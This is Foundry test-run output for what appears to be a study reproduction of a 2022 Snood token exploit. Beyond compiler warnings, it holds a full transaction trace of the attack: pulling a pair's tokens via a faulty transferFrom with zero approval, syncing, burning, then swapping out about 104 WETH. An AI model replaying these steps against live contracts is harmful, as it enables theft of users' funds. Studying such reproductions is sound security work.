Compiling 25 files with Solc 0.8.10
Compiling 26 files with Solc 0.8.25
Solc 0.8.10 finished in 822.79ms
Solc 0.8.25 finished in 931.10ms
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2022-06/Snood_exp.sol:17:5:
   |
17 |     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 274.80ms (192.91µs CPU time)

Ran 1 test for src/test/2022-06/Snood_exp.sol:ContractTest
[PASS] testExploit() (gas: 294531)
Logs:
  before the attack
  0
  WETH after the attack
  104047009087796436864

Traces:
  [322831] ContractTest::testExploit()
    ├─ emit log(val: "before the attack")
    ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x180ea08644b123D8A3f0ECcf2a3b45A582075538) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_uint(val: 0)
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x180ea08644b123D8A3f0ECcf2a3b45A582075538) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertTrue(true) [staticcall]
    │   └─ ← [Return] 
    ├─ [14484] 0xD45740aB9ec920bEdBD9BAb2E863519E59731941::balanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe) [staticcall]
    │   ├─ [7153] 0xeAC2A259f3eBb8fD1097AECcaA62E73b6e43D5bF::balanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe) [delegatecall]
    │   │   └─ ← [Return] 32308960759206669952686933218 [3.23e28]
    │   └─ ← [Return] 32308960759206669952686933218 [3.23e28]
    ├─ [89478] 0xD45740aB9ec920bEdBD9BAb2E863519E59731941::transferFrom(0x0F6b0960d2569f505126341085ED7f0342b67DAe, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 32308960759206669952686933217 [3.23e28])
    │   ├─ [88638] 0xeAC2A259f3eBb8fD1097AECcaA62E73b6e43D5bF::transferFrom(0x0F6b0960d2569f505126341085ED7f0342b67DAe, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 32308960759206669952686933217 [3.23e28]) [delegatecall]
    │   │   ├─ emit Approval(owner: 0x0F6b0960d2569f505126341085ED7f0342b67DAe, spender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
    │   │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0x0F6b0960d2569f505126341085ED7f0342b67DAe, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   ├─ [12331] 0xc5fb34E3f69B18aBfbD17b2bBAbE8c9608D5779a::lockedBalanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe)
    │   │   │   ├─ [5000] 0x8A43aa68442bA8B279793E65fB66aA1D969e4E5a::lockedBalanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ emit Sent(operator: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: 0x0F6b0960d2569f505126341085ED7f0342b67DAe, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 32308960759206669952686933217 [3.23e28], data: 0x, operatorData: 0x)
    │   │   ├─ emit Transfer(from: 0x0F6b0960d2569f505126341085ED7f0342b67DAe, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 32308960759206669952686933217 [3.23e28])
    │   │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   ├─ emit SellQuotaChanged(: 1655535877 [1.655e9], : 1000000000000000000000000000 [1e27])
    │   │   ├─ emit SellQuotaChanged(: 1655535877 [1.655e9], : 33308960759206669952686933217 [3.33e28])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [32252] 0x0F6b0960d2569f505126341085ED7f0342b67DAe::sync()
    │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe) [staticcall]
    │   │   └─ ← [Return] 104047009087796436865 [1.04e20]
    │   ├─ [1984] 0xD45740aB9ec920bEdBD9BAb2E863519E59731941::balanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe) [staticcall]
    │   │   ├─ [1153] 0xeAC2A259f3eBb8fD1097AECcaA62E73b6e43D5bF::balanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe) [delegatecall]
    │   │   │   └─ ← [Return] 1
    │   │   └─ ← [Return] 1
    │   ├─ emit Sync(reserve0: 104047009087796436865 [1.04e20], reserve1: 1)
    │   └─ ← [Stop] 
    ├─ [112136] 0xD45740aB9ec920bEdBD9BAb2E863519E59731941::transfer(0x0F6b0960d2569f505126341085ED7f0342b67DAe, 32308960759206669952686933217 [3.23e28])
    │   ├─ [111302] 0xeAC2A259f3eBb8fD1097AECcaA62E73b6e43D5bF::transfer(0x0F6b0960d2569f505126341085ED7f0342b67DAe, 32308960759206669952686933217 [3.23e28]) [delegatecall]
    │   │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   ├─ [5831] 0xc5fb34E3f69B18aBfbD17b2bBAbE8c9608D5779a::lockedBalanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   ├─ [5000] 0x8A43aa68442bA8B279793E65fB66aA1D969e4E5a::lockedBalanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ emit Sent(operator: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0F6b0960d2569f505126341085ED7f0342b67DAe, amount: 32308960759206669952686933217 [3.23e28], data: 0x, operatorData: 0x)
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0F6b0960d2569f505126341085ED7f0342b67DAe, value: 32308960759206669952686933217 [3.23e28])
    │   │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0x0F6b0960d2569f505126341085ED7f0342b67DAe, 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   ├─ emit SellQuotaChanged(: 1655535877 [1.655e9], : 1000000000000000000000000000 [1e27])
    │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0x0F6b0960d2569f505126341085ED7f0342b67DAe, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   ├─ [1831] 0xc5fb34E3f69B18aBfbD17b2bBAbE8c9608D5779a::lockedBalanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe)
    │   │   │   ├─ [1000] 0x8A43aa68442bA8B279793E65fB66aA1D969e4E5a::lockedBalanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ emit Burned(operator: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: 0x0F6b0960d2569f505126341085ED7f0342b67DAe, amount: 1294032628417696682233234600 [1.294e27], data: 0x, operatorData: 0x)
    │   │   ├─ emit Transfer(from: 0x0F6b0960d2569f505126341085ED7f0342b67DAe, to: 0x0000000000000000000000000000000000000000, value: 1294032628417696682233234600 [1.294e27])
    │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0x0F6b0960d2569f505126341085ED7f0342b67DAe, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   ├─ [1831] 0xc5fb34E3f69B18aBfbD17b2bBAbE8c9608D5779a::lockedBalanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe)
    │   │   │   ├─ [1000] 0x8A43aa68442bA8B279793E65fB66aA1D969e4E5a::lockedBalanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ emit Sent(operator: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: 0x0F6b0960d2569f505126341085ED7f0342b67DAe, to: 0x6D257D2dB115947dc0C75d285B4396a03C577E2E, amount: 32308960759206669952686933 [3.23e25], data: 0x, operatorData: 0x)
    │   │   ├─ emit Transfer(from: 0x0F6b0960d2569f505126341085ED7f0342b67DAe, to: 0x6D257D2dB115947dc0C75d285B4396a03C577E2E, value: 32308960759206669952686933 [3.23e25])
    │   │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0x6D257D2dB115947dc0C75d285B4396a03C577E2E, 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0x0F6b0960d2569f505126341085ED7f0342b67DAe, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   ├─ [1831] 0xc5fb34E3f69B18aBfbD17b2bBAbE8c9608D5779a::lockedBalanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe)
    │   │   │   ├─ [1000] 0x8A43aa68442bA8B279793E65fB66aA1D969e4E5a::lockedBalanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ emit Sent(operator: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: 0x0F6b0960d2569f505126341085ED7f0342b67DAe, to: 0x76D8057a98be823DAe57597118f3a02eea9ccFb6, amount: 1292358430368266798107477328 [1.292e27], data: 0x, operatorData: 0x)
    │   │   ├─ emit Transfer(from: 0x0F6b0960d2569f505126341085ED7f0342b67DAe, to: 0x76D8057a98be823DAe57597118f3a02eea9ccFb6, value: 1292358430368266798107477328 [1.292e27])
    │   │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0x76D8057a98be823DAe57597118f3a02eea9ccFb6, 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [504] 0x0F6b0960d2569f505126341085ED7f0342b67DAe::getReserves()
    │   └─ ← [Return] 104047009087796436865 [1.04e20], 1, 1655535877 [1.655e9]
    ├─ [40587] 0x0F6b0960d2569f505126341085ED7f0342b67DAe::swap(104047009087796436864 [1.04e20], 0, 0x180ea08644b123D8A3f0ECcf2a3b45A582075538, 0x)
    │   ├─ [25962] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(0x180ea08644b123D8A3f0ECcf2a3b45A582075538, 104047009087796436864 [1.04e20])
    │   │   ├─ emit Transfer(from: 0x0F6b0960d2569f505126341085ED7f0342b67DAe, to: 0x180ea08644b123D8A3f0ECcf2a3b45A582075538, value: 104047009087796436864 [1.04e20])
    │   │   └─ ← [Return] true
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe) [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [1984] 0xD45740aB9ec920bEdBD9BAb2E863519E59731941::balanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe) [staticcall]
    │   │   ├─ [1153] 0xeAC2A259f3eBb8fD1097AECcaA62E73b6e43D5bF::balanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe) [delegatecall]
    │   │   │   └─ ← [Return] 29732115690897246905537466158 [2.973e28]
    │   │   └─ ← [Return] 29732115690897246905537466158 [2.973e28]
    │   ├─ emit Sync(reserve0: 1, reserve1: 29732115690897246905537466158 [2.973e28])
    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 29732115690897246905537466157 [2.973e28], amount0Out: 104047009087796436864 [1.04e20], amount1Out: 0, to: 0x180ea08644b123D8A3f0ECcf2a3b45A582075538)
    │   └─ ← [Stop] 
    ├─ emit log(val: "WETH after the attack")
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x180ea08644b123D8A3f0ECcf2a3b45A582075538) [staticcall]
    │   └─ ← [Return] 104047009087796436864 [1.04e20]
    ├─ emit log_uint(val: 104047009087796436864 [1.04e20])
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x180ea08644b123D8A3f0ECcf2a3b45A582075538) [staticcall]
    │   └─ ← [Return] 104047009087796436864 [1.04e20]
    ├─ [0] VM::assertTrue(true) [staticcall]
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 281.45ms (3.57ms CPU time)

Ran 2 test suites in 282.35ms (556.25ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
